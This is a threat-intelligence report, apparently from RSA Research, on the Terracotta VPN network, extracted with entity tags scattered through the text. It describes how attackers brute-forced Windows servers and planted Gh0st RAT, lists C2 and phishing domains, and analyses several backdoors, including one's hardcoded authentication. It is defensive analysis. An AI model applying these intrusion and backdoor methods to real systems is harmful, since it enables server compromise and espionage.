AUTHENTICATION : Closely - tied to the client software is the central client authentication system , by which clients use credentials to authenticate into the client software . Upon successful login , the client software will check for updates and download the latest set of global [ORG] VPN nodes . COMMON VPN NODES : The dynamic set of [CARDINAL] 1500 + [ORG] VPN nodes is another component . These nodes are shared among most of the [ORG] Terracotta [ORG] VPN brands and , most notably , link the different elements of the [ORG] Terracotta VPN ecosystem . The roster of nodes is updated by the various software clients during each login sequence . Figure [CARDINAL] 1 illustrates the relationships between the Terracotta VPN components and the client [ORG] VPN - tunneling sequence.\u2022 USER AUTHENTICATION ; The final component is the central Radius - compatible , [ORG] Internet [ORG] Authentication [ORG] Service ( IAS)directory that authenticates the user account credentials with the [ORG] VPN node . The steps are:1 . The [PERSON] Terracotta user establishes an account ; obtains credentials and client software from [CARDINAL] one of the Terracotta brandwebsites.2 . The user signs into the client [ORG] UI , which authenticates the client credentials against the central client authentication system.3 . The software client will then populate with an updated roster of [ORG] VPN [ORG] nodes.4 . Once the user selects a [ORG] VPN node , the node will authenticate the user credentials with the distributed [ORG] IAS [ORG] directory.5 . Following successful authentication , the Point - to - Point Tunneling Protocol ( PPTP ) or Layer - [ORG] Two [ORG] Tunneling [ORG] Protocol ( L2TP)session is established . At this point the user has successfully tunneled to the Internet through the Terracotta VPN end point . Figure [CARDINAL] 1 . How Terracotta VPN Works6BEHIND THE TERRACOTTA NODES Where do the various [ORG] Terracotta [ORG] VPN providers obtain the resources to build such a vast [ORG] VPN network ? Out of [QUANTITY] 1500 + common [ORG] VPN nodes , it is possible that some servers or appliances were legitimately obtained and leased by the Terracotta VPN operators . We will describe how others were clearly compromised . [ORG] RSA [ORG] Research proposes [CARDINAL] three possible candidates ( [CARDINAL] three devices ) encompassing [CARDINAL] 557 [ORG] IP addresses . We believe these devices are the best possible candidates for legitimate lease by the Terracotta VPN perpetrators for the following reasons:1 . Massive multi - homing : The minimum quantity of [ORG] IP addresses per suspected - legitimately - leased - device is [CARDINAL] 51 . Terracottaservices are marketed as very cost - effective , offering availability of a large [ORG] VPN network for [MONEY] approximately $ [MONEY] 3 / [MONEY] month . Massive multi - homing of a single device is apparently a method for inflating the appearance of the network . A Terracotta VPN client pings and displays all available nodes , noting both the date each node came online and its current response- time . However , while the network may appear to offer multiple new nodes on [DATE] a [DATE] given [DATE] day , nodes with the same enlistment date and similar response - times actually indicate a multi - homed device . Further , network analysis shows the [ORG] VPN clients usually connect to only a single IP address assigned to each massively multi - homed device . This may result in lower maintenance overhead , and indicates that the Terracotta VPN operator knows full - well that there is just [CARDINAL] one device behind the large pool of available nodes . And while there is no performance benefit from having the [ORG] VPN clients ping multiple [ORG] IP addresses from the same devices , doing so perpetuates the illusion of a larger network than what exists . When connecting to each of the nodes depicted in the client UI below ( several nodes reflecting [CARDINAL] one of [CARDINAL] three multi - homed devices [ORG] RSA [ORG] Research has identified ) the exit [ORG] IP addresses are randomly assigned from the large pool of available [ORG] IP addresses . Figure [CARDINAL] 2 . Screenshot of Terracotta client app , listing multi - homed nodes72 . No public services other than PPTP VPN . In instances where [ORG] RSA [ORG] Research has confirmed the compromise of anorganization , the victim organizations used their Internet - facing servers for various use cases , none of which included [ORG] VPN or [ORG] Windows [ORG] Remote [ORG] Access services . If these were compromised devices , we would expect the devices to be used by their legitimate owners for other purposes prior to being enlisted as [ORG] Terracotta [ORG] VPN nodes . If , on the other hand , a legitimate VPN provider was compromised , we expect the operators to have noticed that their authentication process and client - base had been hijacked . Figure [CARDINAL] 3 . RDP Login banner associated with possibly leased [ORG] Terracotta [ORG] VPN node A login splash screen ( Figure [CARDINAL] 3 ) associated with the device with hostname [CARDINAL] 3819027EEA6E42F indicates the use of [ORG] Windows [ORG] Server 2003 Enterprise x64 [ORG] Server , with Simplified [NORP] Chinese locale or [LANGUAGE] Chinese language pack . The latter would be the Windows locale most - commonly used by mainland [GPE] PRC or [ORG] Singapore [ORG] residents.8BEHIND [ORG] TERRACOTTA NODES : THE VICTIMS All of the compromised systems , confirmed through victim - communication by [ORG] RSA [ORG] Research , are Windows servers . [ORG] RSA [ORG] Research suspects that [ORG] Terracotta is targeting vulnerable Windows servers because this platform includes [ORG] VPN services that can be configured quickly ( in a matter of [TIME] seconds ) . While most of the [ORG] Terracotta victims are smaller organizations without dedicated security staff , large organizations were not immune to exploitation by the [ORG] Terracotta perpetrators . Organizations with confirmed compromised Windows servers include : Fortune 500 hotel chain A department of transportation in a [GPE] U.S. state High tech manufacturer Fortune 500 engineering firm [ORG] University [ORG] in [ORG] Taiwan [ORG] University in [ORG] Japan [ORG] State university in the [GPE] U.S. [GPE] County government of a [GPE] U.S. state Prize indemnity insurance company\u2022 \u2022 [ORG] Microsoft [PRODUCT] Windows enterprise managementapplication developer Boutique IT service provider Charter school\u2022 \u2022Educational service provider [PERSON] Law firm [GPE] U.S. university - affiliated company\u2022 \u2022 Web design and SEO consultant \u2022 \u2022Physician \u2019s office [ORG] Unified [ORG] Communications as a [ORG] Service ( UCaaS ) provider Business - to - Consumer ( B2C ) applications developer [ORG] Public [ORG] Convention center in a [GPE] U.S. city\u2022 \u2022 \u2022 [ORG] Wireless test and measurement solutions provider \u2022 \u2022IT [PERSON] Value [PERSON] Added [PERSON] Reseller ( [ORG] VAR ) and services provider IT solutions provider / contractor for federal and local government organizationsThe [CARDINAL] 23 organizations listed above represent [CARDINAL] at [CARDINAL] least [CARDINAL] 31 Windows server systems that were compromised and enlisted into [GPE] Terracotta . TERRACOTTA WINDOWS SERVER ENLISTMENT MODUS OPERANDIA common trait shared with all confirmed victims is that they had Internet - exposed Windows servers without hardware firewalls . Additionally , for [CARDINAL] at [CARDINAL] least [CARDINAL] one victim with multiple servers exposed to the Internet , only those servers with the built - in [PRODUCT] Windows software firewall turned off were enlisted in the [ORG] Terracotta VPN ecosystem . In [CARDINAL] one specific compromised system analyzed by [ORG] RSA [ORG] Research , the following sequence of events , shown in Figure [CARDINAL] 4 , was noted prior to the system becoming a node in the Terracotta VPN ecosystem:1 [ORG] Brute force password attack on the \u201c Administrator \u201d user account , via [ORG] DCOM [ORG] Windows [ORG] Management [ORG] Interface ( WMI)through [ORG] TCP port [CARDINAL] 135 . There are multiple security testing tools with this capability , including the popular [ORG] CoreImpact python class wmiexe.py1 . The brute force activity was done from an [ORG] IP address we call the \u201c reconnaissance host \u201d which was recently observed performing port [CARDINAL] 135 scanning on the Internet , according to DShield2.2 Remote connection using Administrator credentials from the reconnaissance host [TIME] several [TIME] hours [TIME] later to disable the3Windows [PERSON] Firewall and install [ORG] the [ORG] Telnet [ORG] Service . Windows logs for this event sequence are consistent with those that would be recorded with use of standard remote administration tools available from [ORG] Microsoft [ORG] Management [ORG] Console ( MMC ) via standard [ORG] Windows [ORG] Management [ORG] Interface ( [ORG] WMI ) protocols . Login in via [ORG] Remote [ORG] Desktop ( RDP ) from a Windows system we call \u201c base host \u201d , with hostname [PERSON] WEI-270FBC26C38 , originating from [ORG] IP ranges in the vicinity of [GPE] Dongguan , a suburb of [GPE] Guangzhou , [GPE] China . This happens within [TIME] minutes of events in sequence number [CARDINAL] two . [ORG] RSA [ORG] Research has obtained forensic images indicating that this hostname was used for compromises and enlistment from [DATE] January [DATE] 2014 to June [CARDINAL] 2015.1 url [CARDINAL] 2 url base host , uninstall Windows Defender and download and install custom Gh0st [ORG] Remote [ORG] Administration [ORG] Tool ( RAT ) Terracotta Internet Authentication Services ( [ORG] IAS ) servers . Testing of Terracotta VPN centralized [ORG] IAS authentication using \u201c testwj \u201d account from base host WEI-270FBC26C38.7Figure [CARDINAL] 4 . Terracotta VPN enlistmentTHE [ORG] ECONOMICS [ORG] OF [ORG] HACKING [ORG] FOR [ORG] A [ORG] PROFIT Why would a business need to hack servers for use in a [ORG] VPN ecosystem , when [ORG] Virtual [ORG] Private [ORG] Servers ( VPS ) are so readily and inexpensively available ? Currently , high - quality VPS \u2019s with sufficient power for use as a [ORG] VPN node can be leased for [MONEY] as [MONEY] little [MONEY] as $ 5.00 per month in the [GPE] U.S. However , [ORG] VPN traffic is more bandwidth - intensive than CPU - intensive . Since many VPS solutions provide a base - level of bandwidth and charge for overage , the cost of bandwidth for a [ORG] VPN service such as [ORG] Terracotta would significantly affect operating expenses . Even if the [DATE] monthly recurring bandwidth costs of using [ORG] VPS servers were ignored , the logistics of managing the contracts and payments with foreign and domestic providers would add significantly to the cost of operations . Conservatively , [ORG] RSA [ORG] Research counted [CARDINAL] more [CARDINAL] than [CARDINAL] 300 different organizations behind the [QUANTITY] 1500 + nodes in the Terracotta Hypothetical Discussion : If the servers were legitimate , [CARDINAL] at [CARDINAL] least [CARDINAL] 300 [DATE] monthly international transactions would be required to maintain the network . A more - profitable and simpler ( if not legitimate ) model may be to ensnare a seemingly endless supply of vulnerable servers on the Internet . [ORG] RSA [ORG] Research proposes that the [ORG] Terracotta VPN provider \u201c hacks and harvests \u201d [ORG] VPN nodes because this process is not only cheaper , but logistically easier than running a complex accounts payable operation required to maintain a global [QUANTITY] 1500 + node [ORG] VPN ecosystem.10VPN NODES THAT DON\u2019T \u201c LOOK LIKE \u201d VPN NODESSeveral legitimate mainland [GPE] PRC VPN providers were reviewed by [ORG] RSA [ORG] Research . These providers were consistent in that they ostensibly provided a list of all VPN IP addresses on their websites ( Figure [CARDINAL] 5 ) . A security analyst ( or a content service provider with contractual restrictions on geographical distribution ) , would be able to enumerate hosts associated with the [ORG] VPN provider and In contrast , if a portion of your exit [ORG] IP addresses appear to be associated with legitimate businesses and ca n\u2019t be easily classified as [ORG] VPN nodes , then you may attract a customer interested in obscuring its origin . The [ORG] Terracotta - branded providers do not publish such lists . Their exit nodes remain largely unrestricted , an apparent differentiator . Figure [CARDINAL] 5 . [ORG] U.S. [ORG] Nodes as displayed on a legitimate VPN service website11WHO USES TERRACOTTA VPN?To help characterize the [ORG] Terracotta user base , [ORG] RSA [ORG] Research analyzed [ORG] the [ORG] Microsoft [ORG] Remote [ORG] Access [ORG] Service ( MSRAS ) logs for a single Terracotta victim server for [DATE] one [DATE] month ( Table 1).Unique successfully authenticated connections [PERSON] Unique client [ORG] IP addresses [PERSON] Client [PERSON] IP [PERSON] Addresses in mainland [ORG] PRC [ORG] Client [ORG] IP addresses not in mainland [ORG] PRC [ORG] Unique client account names [ORG] Unique client host names118,948 [CARDINAL] 9,053 [CARDINAL] 8,903 ( 98 [PERCENT] % ) [CARDINAL] 150 ( [PERCENT] 2 [PERCENT] % ) [CARDINAL] 723 ( most connections used trial accounts ) [CARDINAL] 3,640Statistics from [DATE] a [DATE] month of logs on an enlisted [ORG] Terracotta NodeTable [CARDINAL] 1 . Clearly , most users of [ORG] Terracotta appear to originate within mainland [GPE] PRC , as is consistent with where the service is marketed . In addition to the [ORG] APT activity that has been observed , [ORG] RSA [ORG] Research believes that use cases include [ORG] Great [ORG] Firewall traversal , anonymity , peer to peer ( P2P ) file sharing and gaming acceleration ; though this traffic analysis research is based on a limited number of network packet captures . Other ( non - [NORP] APT ) criminal activity that may leverage [ORG] Terracotta \u2019s anonymity is possible , but has not been observed to date . The clients of [ORG] Terracotta may be entirely unaware of the organizations methods for obtaining servers and bandwidth . SUSPECTED NATION STATE SPONSORED CAMPAIGNS LEVERAGING Since providing Terracotta VPN indicators to trusted partners , [ORG] RSA [ORG] Research has received several reports of suspected nation - state sponsored campaign activity originating from [ORG] Terracotta [ORG] VPN [ORG] IP addresses . [ORG] RSA [ORG] Research can confirm that suspected nation - state actors have leveraged [CARDINAL] at [CARDINAL] least [CARDINAL] 52 Terracotta VPN nodes for exploitation of sensitive targets among Western government and commercial organizations . Perhaps one of the benefits of using [ORG] Terracotta [ORG] for [ORG] Advanced [ORG] Threat [ORG] Actors is that their espionage- related network traffic can blend - in with \u2018 otherwise - legitimate \u2019 [ORG] VPN traffic . TERRACOTTA VPN LEVERAGED FOR PHISHING AND ATTEMPTED EXPLOITATION OF A DEFENSE CONTRACTORRSA Research received a specific report from a large defense contractor concerning [CARDINAL] 27 different Terracotta VPN node [ORG] IP addresses that were used to send phishing emails ( Figure [CARDINAL] 6 ) targeting users in their organization . The phishing emails were simple HTML formatted emails with content pasted from legitimate online news articles . The HTML formatted emails were loaded with an intelligence - gathering tool known as a \u201c web bug3 \u201d that was specifically tailored to the recipient.3 url [CARDINAL] 6 . Redacted phishing email laden with web bug sent from [ORG] Terracotta [ORG] VPN node IP addressAn image reference in the email pointed to a website controlled by the actors that spoofed a popular Webmail provider . The image reference appeared to have been crafted so as to entice the target into logging into the phishing website with their legitimate credentials ( Figure [CARDINAL] 7 ) , thereby sending the targets \u2019 webmail credentials directly to the malicious actors . Typically [ORG] APT actors use the information they gather from web bugs and phishing to later perform highly targeted exploitation or intelligence collection on specific users who have met their criteria . Figure [CARDINAL] 7 . Spoofed login page for major webmail provider , linked from phishing [ORG] email13RSA [ORG] Research investigated the domain infrastructure related to the phishing activity described above and enumerated related domains , as shown partially redacted in [LAW] Table [LAW] 2 . The partial- and un - redacted domains below are representative of brands that are commonly spoofed for phishing purposes . All of these domains have been reported and are obvious spoofs . The domains we have redacted involve specific government and defense sector targets . These have been reported and the targets have been notified . Further details can be made available to industry partners . [ORG] Domains directly related to defense contractor phishing from [ORG] Terracotta [ORG] VPN nodesweblogin - yahoo.comweblogin - vxxxxxx.netlinkedinmember.comauth - vxxxxxx.comweblogin - live.com[10 related domains based on common hosting]Table [CARDINAL] 2.Terracotta - originating phishing campaign related domainsSHELL_CREWAs part of the investigation , [ORG] RSA [ORG] Research was able to track suspected [LOC] Shell_Crew actors in their ongoing exploitation campaign of a sensitive network over [DATE] several [DATE] months . These actors connected to a [ORG] Derusbi server variant \u201c beachhead \u201d on this target network . Out of the [CARDINAL] thirteen different [ORG] IP addresses used during this campaign against this one ( [ORG] APT ) target , [CARDINAL] eleven ( 85 [PERCENT] % ) were associated with [ORG] Terracotta [ORG] VPN nodes . At least in this [DATE] month \u2019s long campaign , we see advanced threat actors using [ORG] Terracotta [ORG] VPN infrastructure to obscure their origins and cover their tracks . For more information on these advanced threat actors , refer to the [LOC] Shell_Crew report from the [ORG] RSA Incident Response Team here : url VPN BREAKDOWNA recent network node location breakdown of the [GPE] Terracotta network indicates that a high percentage of nodes are in [GPE] China , with secondary focus in [GPE] the [GPE] United [GPE] States and [GPE] South [GPE] Korea . Additionally we see smaller quantities in other disparate locations . Figure [CARDINAL] 8 . Geographic concentration of [ORG] Terracotta [ORG] VPN NodesDETECTIONDepending on what aspect of the attack you are looking for , detecting Terracotta VPN in your network will likely require a number of different detection methods and technologies . DETECTING NODE ENLISTMENT ACTIVITYIf a host has been enlisted as a [ORG] VPN node in the [GPE] Terracotta network , the compromised server will beacon to the following URLs as the servers authenticate users to the VPN service:\u2022\u20221.8800free.info ( currently resolves to [ORG] IP address in [GPE] Zhengzhou , [GPE] Henan [GPE] Province , PRC)2.8800free.info ( currently resolves to [ORG] IP address in [GPE] Hangzhou , [GPE] Zhejiang [GPE] Province , [LOC] PRC)Servers exhibiting this behavior should be examined for compromise . DETECTING NODE USE IN ATTACKSTo detect the use of [ORG] Terracotta [ORG] VPN nodes in attacks , ingress / egress connections from the host nodes should be noted and investigated . Hits on these nodes would indicate anonymization activity from the Terracotta network.15DETECTING USE OF TERRACOTTA VPN RESOURCESTo detect users of this service , connections to \u201c [WORK_OF_ART] Client [WORK_OF_ART] Authentication [WORK_OF_ART] Domains \u201d ( Appendix 1 ) should be monitored . Hits to these domains would indicate an end - user using the downloadable [ORG] VPN client to select [ORG] VPN nodes for use . Additionally , hits to \u201c [WORK_OF_ART] Client [WORK_OF_ART] Marketing [WORK_OF_ART] Domains \u201d ( Appendix 1 ) may indicate an end - user \u201c shopping \u201d for access to the [ORG] VPN service . DETECTING TERRACOTTA ASSOCIATED MALWARERSA Research has associated several notable malware samples with the [PERSON] Terracotta eco - system . These binaries have been used to provide backdoor / RAT services on compromised servers . [ORG] RSA [ORG] Research has observed that this malware is commonly installed by the actors concurrently with other remote administration tools including [PRODUCT] Radmin , [ORG] DameWare , and Windows telnet server . Other lateral reconnaissance and exploitation tools used by the [ORG] Terracotta actors include various port scanners and password dumpers such as [PERSON] Mimikatz and a [NORP] Chinese tool called DolphinQ.4 Additionally , many [ORG] Terracotta nodes had sometimes multiple instances of [ORG] CCProxy installed to provide additional anonymization services . These [ORG] CCProxy instances used locally configured credentials , and not central authentication like the [ORG] VPN services . While this is not a thorough analysis of the malware encountered during this investigation , several samples were directly tied to the initial enlistment of the servers as nodes into the [ORG] Terracotta VPN ecosystem , as mentioned in the Modus Operandi section . Gh0st [ORG] RAT [PRODUCT] MM523 [PRODUCT] File [PRODUCT] Size : [CARDINAL] 21.9 MB Administration Tool ( RAT ) with keystroke logger , file manager , remote terminal shell , screen control and capture , and many other functions . Pertinent analysis on Gh0st [ORG] RAT is available6 . Since the majority of confirmed [PERSON] Terracotta - compromised systems are running [CARDINAL] 64 - bit Windows Server 2008 R2 , this section will detail more findings that are pertinent to that platform , rarely covered by typical sandbox analysis . This particular binary was found on [CARDINAL] only [CARDINAL] one system , but appears to be an installer or \u201c dropper \u201d for the Gh0st malware that was found on multiple Terracotta compromised servers prior to [DATE] February [DATE] 2015 . This malware is unusually large because it is padded with [CARDINAL] zeros . The large file size may have been a rudimentary attempt to avoid antivirus or network security systems . To be sure , absent the padding , a binary comparison proves that the sample is identical to the sample submitted to [ORG] VirusTotal in [DATE] July there are unresolved issues with its installation on Windows 7 and Windows Server 2008R2.The dropper scans the Windows registry here : HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\NetsvcsIt finds the [ORDINAL] first unused ( stopped and disabled ) service that runs under service process svchost netsvcs . On typical Terracotta victim servers , this has been the FastUserSwitchingCompatibility service , which is a deprecated service left - over from [EVENT] Windows [EVENT] 5 [EVENT] A sinkholed domain is one that was used by its owner specifically for malicious activity and thus subject to lawful seizure . [PERSON] Malware that is sinkholed is redirected to an analysis system controlled by researchers or law enforcement instead of the criminals . The sinkhole is then used for intelligence research and victim notification . [CARDINAL] 6 url from that issue include a misspelled and mismatched description for the hijacked FastUserSwitchingCompatibility which is \u201c [WORK_OF_ART] Windows [WORK_OF_ART] Sxitcway [WORK_OF_ART] Firewall / [WORK_OF_ART] Internet [WORK_OF_ART] Connection [WORK_OF_ART] Sharing ( [ORG] ICS ) \u201d . A Google search for the word \u201c Sxitcway \u201d will reveal other malware that encounters similar platform compatibility problems . The dropper installs its service [ORG] DLL named with [CARDINAL] five random letters with the following path in the normally hidden [PRODUCT] ProgramData directory . Example : C:\\ProgramData\\Application Data\\Storm\\update\\%SESSIONNAME%\\hbeya.cc3The Gh0st service [ORG] DLL binary in this location is approximately 22 MB in size , and because the file is generated dynamically , has a unique file hash for each installation . Upon initial execution , the Gh0st RAT dropper is extremely busy , querying for [CARDINAL] some [CARDINAL] 75 URLs associated with legitimate antivirus vendors ; however , no connections are made to these URL for C2 . For control , the [ORG] RAT connects to the [ORG] IP found with a [ORG] DNS query to vps.mm523.net on port [DATE] 10000 using the same connection string as the \u201c cb1st \u201d variant of Gh0st analyzed by [PERSON] Norman in \u201c [WORK_OF_ART] The [WORK_OF_ART] Many [WORK_OF_ART] Faces [WORK_OF_ART] of [WORK_OF_ART] Gh0st \u201d paper here : url Research determined that [CARDINAL] some [CARDINAL] 240 systems around the world are infected with this [GPE] Trojan , including [CARDINAL] approximately [CARDINAL] 100 Research observed malicious services installed by a dropper variant very similar to the [PRODUCT] MM523 Gh0st variant on newly compromised [PERSON] Terracotta victims . While similar to the \u201c Gh0st [ORG] RAT MM523 \u201d build , this build we dub GDS520 has a different service [ORG] DLL location and C2 URL . The GDS520 sample had been in the wild before the RSA Research sinkholing of mm523.net , based on the date [CARDINAL] two dropper variants were uploaded to [ORG] VirusTotal . Similar to Gh0st [ORG] RAT [PRODUCT] MM523 , these variants are characterized by [ORG] DNS lookups to multiple antivirus vendor update URLs , in addition to the C2 URL , [ORG] gds520.com over port [ORG] TCP port 8086 . The Ghost RAT GDS520 service [ORG] DLL is named with [CARDINAL] five random letters and is installed in the following location with the example file name : C:\\ProgramData\\DRM\\%SESSIONNAME%\\vxujx.cc3Notably , the dropper deletes itself after successfully installing the [ORG] RAT service . This is unlike the Gh0st [ORG] RAT MM523 variant , which did not delete itself . Finally , the [CARDINAL] two GDS520 Ghost RAT variants found on [ORG] VirusTotal were built with file properties to resemble a legitimate [ORG] Microsoft program ( Figure [CARDINAL] 9 ) , and included a digital certificate as [CARDINAL] one of the executable \u2019s resources , which can be displayed in the file properties digital signatures tab ( Figure [CARDINAL] 10 ) . RAT files were appended with a digital signature taken from a legitimate file signed by [PERSON] Kaspersky [PERSON] Lab . Since the signature corresponds to a different file , it appeared as invalid . Any more than cursory review of the dropper executable properties would reveal the invalid signature . These dropper samples used the exact same [PERSON] Kaspersky certificate described in the article \u201c [WORK_OF_ART] Certificate Snatching \u2014 ZeuS [WORK_OF_ART] Copies [WORK_OF_ART] Kaspersky \u2019s [WORK_OF_ART] Digital [WORK_OF_ART] Signature \u201d by [CARDINAL] TrendMicro.88 url [CARDINAL] 9 . Gds520 Gh0st RAT installer file detailsFigure [CARDINAL] 10 . Gds520 Gh0st RAT installer with invalid code signing using [ORG] Kaspersky public certificateOn one compromised system investigated in [DATE] May [DATE] of [DATE] 2015 , forensic artifacts showed the source [ORG] IP address of the GDS520 installer ( Figure [DATE] 11).Figure [DATE] 11 . Forensic artifacts left behind on a victim server by the actor downloading the GDS520 Gh0stRAT installer from a [ORG] Beijing [ORG] IP address18A cache of the page indicated it was from a type of ephemeral file server known as [DATE] HTTPFileServer ( [ORG] HFS)9 . The HFS server cached page showed that the [ORG] HFS daemon had been up for [TIME] 4 [TIME] minutes ( Figure [CARDINAL] 12 ) . Fortunately for the investigation , the ephemeral [ORG] HFS daemon maintains usage statistics . Out of the [CARDINAL] 37 files available on the [ORG] HFS page to the [ORG] Terracotta actor , the GDS520 Gh0st [ORG] RAT appeared to be the most commonly downloaded , with [CARDINAL] 1225 total downloads ( Figure [CARDINAL] 12).9 url [CARDINAL] 12 . HFS - hosted tool repository from which [ORG] Terracotta actor downloaded the GDS520 RATinstalled on victim server . Note the yellow - highlighted information for \u201c s.exe\u201d.20The HFS daemon was running on an [ORG] IP address from a range assigned to a middle school in [GPE] Beijing according to [PERSON] Whois [PERSON] information10 . Virus Total11 [CARDINAL] 12 [CARDINAL] 13 [CARDINAL] 14 reveals that hosts in this [ORG] IP range have been used , extensively in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2015 , to host malicious tools including the GDS520 Gh0st RAT variant and other exploitation tools found on [CARDINAL] at [CARDINAL] least [CARDINAL] three Terracotta victim systems . Also notable in Figure [CARDINAL] 12 is the [ORDINAL] third most - often downloaded tool from the actor \u2019s HFS page , named \u201c Win64.exe15 . \u201d [ORG] RSA [ORG] Research found this on [CARDINAL] one Terracotta victim server , and determined this to be a variant of the Windows privilege escalation exploit tool as described by [PERSON] Crowdstrike in a blog post on [EVENT] Hurricane Panda16 . [ORG] RSA [ORG] Research does not know if the [ORG] Beijing [ORG] IP address range was leveraged exclusively by [ORG] Terracotta operators . [ORG] Mitozhan [ORG] Trojan [ORG] File [ORG] Size : [CARDINAL] 87 [PERSON] KB runs , the executable name will vary but the file name length remains the same ; [CARDINAL] 6 characters . Example : C:\\WINDOWS\\fatjse.exeThe Image Path of the newly - copied file is then used to add a new service to [ORG] the [ORG] ControlSet [ORG] Registry [ORG] Key . This will ensure persistence on the infected machine . The name of the new service ( GHIJKL NOPQRSTU WXY ) might be suspicious to administrators . Example : RegKey Name : MACHINE\\SYSTEM\\CONTROLSET001\\SERVICES\\GHIJKL NOPQRSTU WXYRegKey Data : C:\\WINDOWS\\fatjse.exes\\\\0The malware performs a [ORG] DNS request to vps.xxxxx.net for resolution of its controller . The infected machine connects to the controller over [ORG] TCP port [CARDINAL] 81 with the following initial connection string ( Figure [CARDINAL] 13).Figure [CARDINAL] 13 . Mitozhan C2 connection stringTwo strings of interest are revealed upon examination of the process in [PERCENT] memory.%c%c%c%c%c%c.exeGET [PERCENT] % s HTTP/1.1Content - Type : text / htmlHost : % sAccept : text / html , * /*User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] % [GPE] d.00 ; [ORG] Windows [ORG] NT [ORG] % d.0 ; [CARDINAL] MyIE [CARDINAL] 3.01)Search engine results for the last part of the [ORG] UA string [EVENT] MyIE [EVENT] 3.01 show the exact [ORG] UA string mentioned in a blog post by [ORG] FireEye in [DATE] 201017 . The [ORG] FireEye blog references another blog by researchers from [ORG] Arbor [ORG] Networks18 . The latter blog describes in more10 url [CARDINAL] 11 url [CARDINAL] 12 url [CARDINAL] 13 url [CARDINAL] 14 url [CARDINAL] 16 url [CARDINAL] 17 url [CARDINAL] 18 url the malware behavior , which shares several elements with the sample under investigation , including the use of a raw [ORG] TCP connection to the server , the [ORG] UA string in memory , and the pattern to generate the executable name . The legitimate properties and text depicted in the file appear to obscure the actual malicious intent . The file is named after a very popular photo markup program in [GPE] China called ( cid:0)19 or \u201c [WORK_OF_ART] Mito [WORK_OF_ART] Xiu [WORK_OF_ART] Xiu \u201d ( Figure [DATE] 14).Figure [DATE] 14 . Mitozhan file properties shares name and description with popular benign programRSA Research determined that [CARDINAL] approximately [CARDINAL] 180 systems were infected with this [GPE] Trojan , [CARDINAL] approximately [CARDINAL] one [CARDINAL] third of which were active in the Terracotta VPN node ecosystem . [PERSON] Backdoor [PERSON] Liudoor [PERSON] File [PERSON] Size : [CARDINAL] 87 [PERSON] KB victim servers , that [ORG] RSA [ORG] Research has dubbed Liudoor . It was installed as [GPE] Windows\\SysWOW64\\rasauto.dll running as what would be the unused \u201c [WORK_OF_ART] RasAuto \u201d service on victim Windows Server 2008 R2 systems . While [ORG] RSA [ORG] Research did not find the dropper for this backdoor , it could have just as easily been installed with a batch script . This sample binds to [ORG] TCP port [CARDINAL] 3433 and waits for an incoming request , probably from a dedicated client used by its operator . It will send the [CARDINAL] 4 bytes \" pass \" , it expects to receive the binary string \" E10ADC3949BA59ABBE56E057F20F883E \" ( shown here in [ORG] ASCII text ) . This is the MD5 hash of the [ORG] ASCII string \" [DATE] 123456 \" . The backdoor process will compare what is passed from the client to that hard coded value , and if successful it will send back \" succ \" , if not it will sent back \" fail\" . Once the sample has successfully authenticated it will create a thread and pipe data back and forth to the Windows command shell process , cmd.exe . It takes the input and parses the string sent to the sample for [FAC] 0x0D ( the obfuscation XOR key ) or carriage return and then passes everything before that to cmd.exe . The shell can be halted with the \" exit \" command . Other hard coded binary options include a certain value that will run the console program \u201c nbstat.exe \u201d for [ORG] NetBIOS network information , which might be useful to its operator for lateral exploitation of other Windows computers on the victim network . [CARDINAL] 21 url [ORG] RSA [ORG] ECATOrganizations with robust and consistently applied security controls on Internet - facing infrastructure should face little risk that their servers would be enlisted as [ORG] VPN nodes by [ORG] Terracotta actors . [CARDINAL] Two Fortune 500 companies that were identified as victims were exceptions as the comprehensive application of security controls fell short . More threatening to otherwise well - defended organizations is the threat of advanced threat actors originating from legitimate , but compromised , organizations . Any network connection with a Terracotta VPN node should be treated with great suspicion and investigated immediately . Built into [ORG] RSA [ORG] Security [ORG] Analytics is the automatic threat intelligence aggregation and delivery system known as RSA Live . Updated Terracotta node [ORG] IP addresses are provided in RSA Live as part of the suspect [ORG] VPN node feed , and available upon request . In Figure [CARDINAL] 15 , [ORG] RSA [ORG] Security [ORG] Analytics has alerted on the [ORG] Derusbi server handshake parser from RSA Live . It also has alerted on the source of the malicious [ORG] Derusbi [ORG] Command and Control ( C2 ) which is a [GPE] Terracotta node , described as a criminal VPN service exit node by [ORG] Security [ORG] Analytics . Figure [CARDINAL] 15 . [ORG] RSA [ORG] Security [ORG] Analytics detects advanced threat control of [ORG] Derusbi server backdoororiginating from Terracotta VPN Node23In Figure [CARDINAL] 16 , a redacted screenshot from [ORG] RSA [ORG] Security [ORG] Analytics shows an alert on a suspicious login to an otherwise secure website from a Terracotta VPN node . Any authentication from [ORG] Terracotta to an organization \u2019s secure websites should be treated as hostile and investigated accordingly . Figure [CARDINAL] 16 . [ORG] RSA [ORG] Security [ORG] Analytics detection of secure website login ( redacted ) from Terracotta VPN24DETECTING TERRACOTTA MALWARE USING RSA SECURITY ANALYTICS AND [ORG] ECAT\u201cAn ounce of prevention is worth a pound of cure . \u201d Certainly this idiom from [PERSON] Ben [PERSON] Franklin applies to efforts to defend against this class of threats ( not particularly sophisticated , opportunistic , but potentially very costly ) . [ORG] RSA [ORG] Research assesses that had the [PRODUCT] Windows firewall been turned on , and the default \u201c Administrator \u201d account been renamed in each of the victim systems examined , the systems would not have been compromised with the methods employed by [PERSON] Terracotta . Still , in both large and small organizations , a dichotomy may manifest between a \u201c Security 101 \u201d policy and application of that policy , especially in development and cloud environments . Note : This is not intended to be a cyber - hunter \u2019s cookbook for finding [PERSON] Terracotta activity with [ORG] RSA [ORG] Security [ORG] Analytics and [ORG] ECAT , but rather to offer takeaways on the indicators quickly identified by these tools . The \u201c out of the box \u201d Gh0st protocol parser from RSA Live detects the \u201c [PERSON] cb1st \u201d Gh0st protocol string used by both the GDS520 and MM523Gh0st [ORG] RAT variants , highlighted in red in Figure [CARDINAL] 17 . [ORG] Security [ORG] Analytics shows an actual victim system in [GPE] Iran that was infected with the now - neutralized [PRODUCT] MM523 Gh0st RAT variant calling - back to a [ORG] RSA [ORG] Research sinkhole . Figure [CARDINAL] 17 . Gh0st protocol employed by MM523 Gh0st [ORG] RAT detected by [ORG] RSA [ORG] Security Analytics25RSA [ORG] ECAT will readily detect both Gh0st [ORG] RAT variants employed by the [PERSON] Terracotta actors . In Figure [CARDINAL] 18 , [ORG] RSA [ORG] ECAT has raised [ORG] the [ORG] Threat 